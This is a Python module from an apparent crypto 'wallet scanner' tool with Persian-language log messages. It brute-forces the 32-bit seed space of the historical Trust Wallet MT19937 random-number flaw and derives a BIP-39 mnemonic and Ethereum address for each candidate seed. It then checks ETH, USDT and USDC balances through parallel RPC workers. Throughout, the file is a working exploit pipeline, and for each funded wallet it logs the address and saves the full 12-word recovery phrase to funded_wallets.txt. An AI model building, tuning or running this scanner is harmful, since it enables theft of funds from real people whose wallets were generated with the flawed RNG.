"""Scanner engine: background seed-space traversal + on-chain balance audit.

Pipeline per seed (uint32, matching the historical Trust Wallet RNG flaw):
  MT19937(seed) -> random_buffer(16) -> BIP-39 checksum filter ->
  mnemonic/address derivation -> ETH + USDT + USDC balance check via RPC.

V3.1 pipeline stages (all parallel, no artificial throttle by default):
  producer  — numpy batched entropy + checksum filter (~35k seeds/s)
  derivers  — N CPU threads deriving mnemonics/addresses from filtered seeds
  workers   — M RPC threads checking balances via one batched call per wallet

Hits (balance above either threshold) are appended to funded_wallets.txt and
shown in the UI.  A "checked zero" bloom-free cache prevents re-checking the
same address across restarts within a session.
"""
from __future__ import annotations

import hashlib
import os
import queue
import threading
import time
from collections import deque
from pathlib import Path

from balance import (
    RPCUnavailable, get_all_balances, probe_endpoints, raw_to_usd, wei_to_eth,
)
from mt_fast import HAS_NUMPY
from wallet_model import entropy_for_chunk, wallet_for_seed

HITS_FILE = Path(__file__).resolve().parent.parent / "funded_wallets.txt"
DERIVER_THREADS = max(2, (os.cpu_count() or 4))
RPC_WORKERS = 8
QUEUE_MAX = 20_000


class Scanner:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._threads: list[threading.Thread] = []
        self.running = False
        self.stop_event = threading.Event()
        self._derive_q: queue.Queue = queue.Queue(maxsize=QUEUE_MAX)
        self._check_q: queue.Queue = queue.Queue(maxsize=QUEUE_MAX)

        # settings
        self.start_seed = 0
        self.end_seed = 2**32 - 1
        self.duration_sec = 0           # 0 = run until stopped; >0 test window
        self.batch_size = 200           # valid wallets checked per interval
        self.interval_sec = 0.0         # pause between check batches (0 = none)
        self.threshold_eth = 0.0        # min ETH to count as "has funds"
        self.threshold_usdt = 0.0       # min USDT/USDC (stablecoins) to count

        # state
        self.next_seed = 0
        self.seeds_scanned = 0
        self.wallets_derived = 0
        self.balances_checked = 0
        self.pending_checks = 0
        self.funded: list[dict] = []
        self.errors: int = 0
        self.last_error = ""
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self.logs: deque[str] = deque(maxlen=200)
        self.rpc_health: dict[str, bool] = {}
        self._seen_addr: set[str] = set()
        self._rate_window: list[float] = []

    # ------------------------------------------------------------------ API
    def configure(self, **kw) -> None:
        with self._lock:
            for k, v in kw.items():
                if hasattr(self, k) and v is not None:
                    setattr(self, k, v)

    def status(self) -> dict:
        with self._lock:
            elapsed = 0.0
            if self.started_at:
                elapsed = (self.finished_at or time.time()) - self.started_at
            now = time.time()
            self._rate_window = [t for t in self._rate_window if now - t < 10.0]
            rate = len(self._rate_window) / 10.0
            return {
                "running": self.running,
                "start_seed": self.start_seed, "end_seed": self.end_seed,
                "next_seed": self.next_seed, "seeds_scanned": self.seeds_scanned,
                "wallets_derived": self.wallets_derived,
                "balances_checked": self.balances_checked,
                "pending_checks": self.pending_checks,
                "funded_count": len(self.funded),
                "errors": self.errors, "last_error": self.last_error,
                "elapsed_sec": round(elapsed, 1),
                "duration_sec": self.duration_sec,
                "interval_sec": self.interval_sec,
                "batch_size": self.batch_size,
                "threshold_eth": self.threshold_eth,
                "threshold_usdt": self.threshold_usdt,
                "workers": RPC_WORKERS,
                "derivers": DERIVER_THREADS,
                "numpy": HAS_NUMPY,
                "rpc_rate_per_sec": round(rate, 1),
                "rpc_health": self.rpc_health,
                "progress_pct": round(
                    100.0 * (self.next_seed - self.start_seed)
                    / max(1, self.end_seed - self.start_seed + 1), 4),
                "funded": list(self.funded),
                "logs": list(self.logs),
            }

    def start(self) -> bool:
        with self._lock:
            if self.running:
                return False
            self.running = True
            self.stop_event.clear()
            self.finished_at = None
            self.started_at = time.time()
            if self.next_seed < self.start_seed or self.next_seed > self.end_seed:
                self.next_seed = self.start_seed
            self._drain_queues()
            self._log(f"شروع پیمایش از seed {self.next_seed} تا {self.end_seed} "
                      f"({DERIVER_THREADS} deriv-thread، {RPC_WORKERS} RPC worker"
                      f"{'، numpy فعال' if HAS_NUMPY else '، بدون numpy'})")
            self._threads = [
                threading.Thread(target=self._producer, daemon=True, name="producer"),
                *[threading.Thread(target=self._deriver, daemon=True,
                                   name=f"deriver-{i}") for i in range(DERIVER_THREADS)],
                *[threading.Thread(target=self._worker, daemon=True,
                                   name=f"balance-worker-{i}") for i in range(RPC_WORKERS)],
            ]
            for t in self._threads:
                t.start()
        # endpoint health probe off the critical path
        threading.Thread(target=self._probe_rpc, daemon=True).start()
        return True

    def _probe_rpc(self) -> None:
        try:
            health = probe_endpoints()
            alive = sum(1 for v in health.values() if v)
            with self._lock:
                self.rpc_health = health
                self._log(f"RPC: {alive}/{len(health)} اندپوینت سالم")
                if alive == 0:
                    self.last_error = "هیچ اندپوینت RPC در دسترس نیست"
        except Exception as exc:  # noqa: BLE001
            with self._lock:
                self.last_error = f"rpc probe failed: {exc}"[:200]

    def stop(self) -> bool:
        with self._lock:
            if not self.running:
                return False
            self.stop_event.set()
            self.running = False
            self.finished_at = time.time()
            self._log("توقف توسط کاربر")
            return True

    def reset(self) -> None:
        with self._lock:
            self.stop_event.set()
            self.running = False
            self.next_seed = self.start_seed
            self.seeds_scanned = self.wallets_derived = self.balances_checked = 0
            self.pending_checks = 0
            self.errors = 0
            self.funded = []
            self.started_at = self.finished_at = None
            self.logs.clear()
            self._seen_addr.clear()
            self._rate_window.clear()
        self._drain_queues()

    # ------------------------------------------------------------- helpers
    def _log(self, msg: str) -> None:
        self.logs.appendleft(f"{time.strftime('%H:%M:%S')} | {msg}")

    def _drain_queues(self) -> None:
        for q in (self._derive_q, self._check_q):
            try:
                while True:
                    item = q.get_nowait()
                    if q is self._check_q and item is not None:
                        with self._lock:
                            self.pending_checks = max(0, self.pending_checks - 1)
            except queue.Empty:
                pass

    def _put(self, q: queue.Queue, item) -> bool:
        """Non-blocking-ish put that respects stop_event; returns success."""
        deadline = time.time() + 20
        while not self.stop_event.is_set():
            try:
                q.put(item, timeout=0.5)
                return True
            except queue.Full:
                if time.time() >= deadline:
                    with self._lock:
                        self.errors += 1
                        self.last_error = "pipeline queue full"
                    return False
        return False

    # ----------------------------------------------- stage 1: producer
    def _producer(self) -> None:
        """Batch-generate entropy + checksum-filter seeds, feed the derivers."""
        deadline = (time.time() + self.duration_sec) if self.duration_sec else None
        CHUNK = 4096
        try:
            while not self.stop_event.is_set():
                with self._lock:
                    seed = self.next_seed
                if seed > self.end_seed:
                    with self._lock:
                        self._log("پایان محدوده seedها")
                    break
                hi = min(seed + CHUNK - 1, self.end_seed)
                n = hi - seed + 1
                # vectorised entropy for the whole chunk, then BIP-39 checksum filter
                ents = entropy_for_chunk(seed, n)
                keep = [s for s in range(seed, hi + 1)
                        if hashlib.sha256(ents[s - seed]).digest()[0] % 16 == 0]
                with self._lock:
                    self.next_seed = hi + 1
                    self.seeds_scanned += n
                for s in keep:
                    if self.stop_event.is_set():
                        break
                    if not self._put(self._derive_q, s):
                        break
                if deadline and time.time() >= deadline:
                    with self._lock:
                        self._log("اتمام زمان تست تعیین‌شده")
                    break
        finally:
            self.stop_event.set()
            for _ in range(DERIVER_THREADS):
                self._wake(self._derive_q)
            for _ in range(RPC_WORKERS):
                self._wake(self._check_q)

    @staticmethod
    def _wake(q: queue.Queue) -> None:
        try:
            q.put_nowait(None)
        except queue.Full:
            pass

    # ----------------------------------------------- stage 2: derivers
    def _deriver(self) -> None:
        while not self.stop_event.is_set():
            try:
                seed = self._derive_q.get(timeout=0.5)
            except queue.Empty:
                continue
            if seed is None:
                break
            try:
                mn, addr = wallet_for_seed(seed)
            except Exception as exc:  # noqa: BLE001 - never kill the pipeline
                with self._lock:
                    self.errors += 1
                    self.last_error = f"derive seed={seed}: {exc}"[:200]
                continue
            with self._lock:
                self.wallets_derived += 1
                dup = addr in self._seen_addr
            if dup:
                continue
            item = (seed, mn, addr)
            if self._put(self._check_q, item):
                with self._lock:
                    self.pending_checks += 1

    # ------------------------------------------------ stage 3: rpc workers
    def _worker(self) -> None:
        while not self.stop_event.is_set():
            try:
                item = self._check_q.get(timeout=0.5)
            except queue.Empty:
                continue
            if item is None:
                break
            s, mn, addr = item
            try:
                eth_wei, usdt_raw, usdc_raw = get_all_balances(addr)
            except RPCUnavailable as exc:
                with self._lock:
                    self.errors += 1
                    self.last_error = str(exc)[:200]
                    self.pending_checks = max(0, self.pending_checks - 1)
                continue
            with self._lock:
                self.pending_checks = max(0, self.pending_checks - 1)
                self.balances_checked += 1
                self._rate_window.append(time.time())
                te, ts = self.threshold_eth, self.threshold_usdt
            eth = wei_to_eth(eth_wei)
            usdt = raw_to_usd(usdt_raw)
            usdc = raw_to_usd(usdc_raw)
            hit = (eth_wei > 0 and eth >= te) or (usdt_raw > 0 and usdt >= ts) \
                or (usdc_raw > 0 and usdc >= ts)
            if hit:
                rec = {"seed": s, "mnemonic": mn, "address": addr,
                       "wei": str(eth_wei), "eth": eth,
                       "usdt": usdt, "usdc": usdc,
                       "found_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                with self._lock:
                    self.funded.append(rec)
                    self._log(f"ولت دارای موجودی! seed={s} {addr[:10]}… "
                              f"{eth:.6f} ETH / {usdt:.2f} USDT / {usdc:.2f} USDC")
                self._append_hit(rec)

    @staticmethod
    def _append_hit(rec: dict) -> None:
        header = "# ولت‌های دارای موجودی — یافت‌شده توسط Wallet Scanner V3.1\n"
        line = (f"{rec['found_at']} | seed={rec['seed']} | "
                f"{rec['eth']:.18f} ETH | {rec['usdt']:.6f} USDT | "
                f"{rec['usdc']:.6f} USDC | {rec['address']}\n"
                f"12 words: {rec['mnemonic']}\n\n")
        first = not HITS_FILE.exists() or HITS_FILE.stat().st_size == 0
        with HITS_FILE.open("a", encoding="utf-8") as fh:
            if first:
                fh.write(header)
            fh.write(line)
